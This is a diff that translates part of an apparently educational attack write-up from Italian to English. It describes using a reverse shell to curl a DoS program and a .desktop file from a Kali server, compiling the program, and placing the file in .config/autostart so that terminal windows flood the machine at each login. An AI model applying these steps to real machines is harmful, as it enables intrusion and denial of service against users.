@@ -60,20 +60,20 @@ At this point, being the reverse shell executed in the background, the user on U
 
 ![Reverse Shell](images/reverseshell.png)
 
-# DoS e persistence
+# DoS and persistence
 
-Utilizzando la reverse shell, ora, è facile scaricare il programma `dos.c` e il file `dos.desktop` dal web file server di Kali utilizzando sempre il comando `curl`:
+Using the reverse shell, now, it is easy to download the `dos.c` program and the `dos.desktop` file from the Kali web file server always using the `curl` command:
 `curl -O "http://10.0.2.2/demo/dos.c"`
 `curl -O "http://10.0.2.2/demo/dos.desktop"`
-ora, il programma dos.c viene compilato utilizzando il comando `ggc -o dos dos.c`, viene creato, così, l'eseguibile. Prima di eseguirlo, però, bisogna creare persistenza: il file `dos.desktop` viene spostato in `.config/autostart`, per fare ciò viene utilizzato il comando `mv`, che deve, però, essere eseguito con privilegi di amministratore, quindi utilizzando `sudo`, questo implica che l'attaccante debba conoscere la password dell'account. Una volta che `dos.desktop` viene spostato, il programma `dos` è visibile in Startup Application Preferences, che mostra i programmi che vengono eseguiti allo startup della macchina. 
+now, the dos.c program is compiled using the `ggc -o dos dos.c` command, thus creating the executable. Before running it, however, persistence must be created: the `dos.desktop` file is moved to `.config/autostart`, to do this the `mv` command is used, which must, however, be executed with administrator privileges, therefore using `sudo`, this implies that the attacker must know the account password. Once `dos.desktop` is moved, the `dos` program is visible in Startup Application Preferences, which shows the programs that are run at the machine startup.
 
 ![Startup Application Preferences](images/startupapplications.png)
 
-quindi, ogni volta che avverrà l'accesso alla macchina, verranno aperte in loop innumerevoli finestre di terminale, rendendolo inutilizzabile. 
+So, every time the machine is accessed, countless terminal windows will be opened in a loop, making it unusable.
 
 ![DoS](images/dos.png)
 
-Inoltre, un'altra feature interessante è che, provando a rimuovere `dos` utilizzando l'applicazione Startup Application Preferences e riavvinado la macchina, il programma viene eseguito comunque, questo perchè non viene rimosso il file `dos.desktop` presente in `.config/autostart`, il quale continua rimettere il programma tra le applicazioni da eseguire all'avvio. 
-Per fermare questo attacco si potrebbe pensare di cancellare l'eseguibile `dos`, ma nel caso in cui questo venga a sua volta posto in una cartella non facilmente raggiungibile, questo non si potrebbe fare, soprattutto se non si sa cosa sta succedendo e se la macchina comincia a crashare. 
-In alternativa si potrebbe pensare si cancellare il file dos.desktop, ma essendo collocato in una directory nascosta di default ed essendo il terminale non utilizzabile, questo potrebbe risultare difficile.
+Furthermore, another interesting feature is that, trying to remove `dos` using the Startup Application Preferences application and restarting the machine, the program is still executed, this is because the `dos.desktop` file present in `.config/autostart` is not removed, and continues to put the program among the applications to be executed at startup.
+To stop this attack you might think of deleting the `dos` executable, but in case it is placed in a folder not easily reachable, this could not be done, especially if you do not know what is happening and if the machine starts to crash.
+Alternatively, you could think of deleting the `dos.desktop` file, but given that it is located in a directory that is hidden by default and given that the terminal is unusable, this could be difficult.
 
